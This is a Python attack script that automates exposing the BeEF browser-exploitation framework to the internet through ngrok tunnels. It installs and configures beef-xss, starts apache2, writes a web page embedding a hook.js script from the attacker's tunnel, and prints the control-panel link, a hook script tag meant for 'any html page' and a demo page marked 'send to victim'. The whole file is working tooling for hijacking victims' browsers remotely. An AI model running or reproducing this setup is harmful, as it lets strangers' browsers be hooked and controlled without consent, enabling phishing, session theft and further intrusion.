#!/usr/bin/env python3

import os
import subprocess
import platform
from termcolor import cprint
import time
import re

class BON:
    def __init__(self):
        print("\n")
        if platform.system() != 'Linux':
            cprint('[-] Linux detection failed', 'red')
            exit()
        else:
            cprint('[+] Linux detected', 'green')
        if os.getuid() != 0:
            cprint('[-] You need to have root privileges to run this script', 'yellow', 'on_red')
            exit()
        else:
            cprint('[+] Got Sudo Privileges', 'green')
        self.port_3000 = ""
        self.port_80 = ""
        self.path = "/usr/share/beef-xss"

    def ngrok_info(self):
        cprint('''
        NGROK Steps :-

            STEP 1 : Add these Lines To ngrok.yml [Location .ngrok2/ngrok.yml ]
                
                tunnels:
                    first-app:
                        addr: 80
                        proto: http
                    second-app:
                        addr: 3000
                        proto: http
                
            STEP 2 : Now Start ngrok with : \n
                    ngrok start --all

            STEP 3 : You will See 2 different links Forwarded to\n 
                Localhost:80              [ Link To be Sent to Victim ]\n
                    Localhost:3000		  [ Your Link will be Connecting to.. ] 	
                                    
            STEP 4 : Enter these links in Script and Follow The Steps given in Script.

        ''', 'green')

    def banner(self):
        print('''

            ____             __             _               _   _                 _    
            | __ )  ___  ___ / _|  _   _ ___(_)_ __   __ _  | \ | | __ _ _ __ ___ | | __
            |  _ \ / _ \/ _ \ |_  | | | / __| | '_ \ / _` | |  \| |/ _` | '__/ _ \| |/ /
            | |_) |  __/  __/  _| | |_| \__ \ | | | | (_| | | |\  | (_| | | | (_) |   < 
            |____/ \___|\___|_|    \__,_|___/_|_| |_|\__, | |_| \_|\__, |_|  \___/|_|\_\
                                                    |___/         |___/                



        ''')

    def check_beef_status(self):
        check_beef = subprocess.Popen('which beef-xss', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = check_beef.stdout.read() + check_beef.stderr.read()
        result = result.decode()
        if 'beef-xss' in result:
            return True
        else:
            return False

    def check_config(self):
        if os.path.exists(self.path + "/config.yaml"):
            return True
        else:
            cprint("\n[-] Error detecting config.yaml in " + self.path, 'red')
            cprint("[-] Aborting...\n\n", 'red')

    def dependencies(self):
        if self.check_beef_status():
            cprint("[+] Beef-framework status passed", 'green')
        else:
            cprint("[-] Beef-framework installation detection failed\n\n", 'red')
            check = input("Do you want to install beef? (y/n) ")
            if(check == 'y'):
                self.install_beef()
            else:
                cprint("Aborting...", 'red')
                exit()
        time.sleep(1)
        subprocess.run(['clear'])
        self.ngrok_info()
        input("\n\nPress enter to continue")
        subprocess.run(['clear'])
        self.run()

    def install_beef(self):
        subprocess.run(['clear'])
        cprint('[!] Installing beef-xss\n', 'yellow')
        subprocess.run(['sudo', 'apt', 'install', 'beef-xss'])

        if self.check_beef_status():
            cprint("[+] Installed beef successfully", 'green')
            time.sleep(1)
            subprocess.run(['clear'])
            self.ngrok_info()
            input("\n\nPress enter to continue")
            subprocess.run(['clear'])
            self.run()
        else:
            cprint("\n[-] Installation failed", 'red')
            cprint("[-] Aborting...\n\n", 'red')
            exit()

    def backup(self):
        if not os.path.exists(self.path + "/backup/config.yaml"):
            os.mkdir(self.path + "/backup")
            subprocess.run(['cp', self.path + '/config.yaml', self.path + '/backup/config.yaml'])

    def replace(self, file_name):
        newdata = ""
        f = open(file_name,'r')
        filedata = f.readlines()
        f.close()
        for line in filedata:
            if "hostname/IP address" in line or "ngrok" in line:
                newdata += "    public: " + self.port_3000 + "\n"
            elif "(experimental)" in line:
                newdata += "    public_port: '80'\n"
            else:
                newdata += line

        f = open(file_name,'w')
        f.write(newdata)
        f.close()

    def start_services(self):
        try:
            cprint("\n[!] Starting apache2 service", "yellow")
            subprocess.run(['service', 'apache2', 'start'])
            cprint("\n[!] Starting beef-framework", "yellow")
            subprocess.run(['beef-xss'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except Exception:
            cprint("\n[-] Sorry, Something went wrong!!!", 'red')
            cprint("\n[-] Aborting...", 'red')
            exit()

    def getdata(self):
        self.port_3000 = input("Enter link for port 3000: ").strip()
        self.port_3000 = self.port_3000.replace("https://", "")
        self.port_3000 = self.port_3000.replace("http://", "")
        self.port_80 = input("Enter link for port 80: ").strip()
        self.port_80 = self.port_80.replace("https://", "")
        self.port_80 = self.port_80.replace("http://", "")

        if not ("ngrok" in self.port_3000 and "ngrok" in self.port_80):
            cprint("\n[-] Invalid input, please try again with valid ngrok link", 'red')
            cprint("[-] Aborting...", "red")
            exit()

    def display_result(self):
        print("\nBeef UI link (To view victim list and control): ", end="")
        cprint("http://" + self.port_3000 + "/ui/panel", "green")
        print("Hook script (Can be embedded in any html page): ", end="")
        cprint("<script src=http://" + self.port_3000 + "/hook.js></script>", "green")
        print("Demo Html webpage (send to victim): ", end="")
        cprint("http://" + self.port_80 + "/beef.html", "green")
    
    def restore(self, file_name):
        cprint("\n[!] Stopping apache2 service", "yellow")
        subprocess.run(['service', 'apache2', 'stop'])
        cprint("\n[!] Stopping beef-framework", "yellow")
        subprocess.run(['beef-xss-stop'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        newdata = ""
        f = open(file_name,'r')
        filedata = f.readlines()
        f.close()
        for line in filedata:
            if "ngrok" in line:
                newdata += "    #public: ""      # public hostname/IP address\n"
            elif "public_port" in line:
                newdata += "    #public_port: "" # public port (experimental)\n"
            else:
                newdata += line

        f = open(file_name,'w')
        f.write(newdata)
        f.close()

    def demo_html(self):
        html_data = "<!DOCTYPE html>\n<html>\n<body>\n<h1>Browser Hooked with beef</h1>\n"
        html_data += "<script src=http://" + self.port_3000 + "/hook.js></script>\n"
        html_data += "</body>\n</html>"

        f = open("/var/www/html/beef.html",'w')
        f.write(html_data)
        f.close()

    def run(self):
        self.banner()
        self.check_config()
        try:
            self.getdata()
        except KeyboardInterrupt:
            cprint("\n\n[!] Restoring....", "yellow")

        self.backup()
        self.replace(self.path + "/config.yaml")
        self.start_services()
        self.demo_html()
        self.display_result()
        input("\nPress enter to exit")
        self.restore(self.path + "/config.yaml")


a = BON()
a.dependencies()
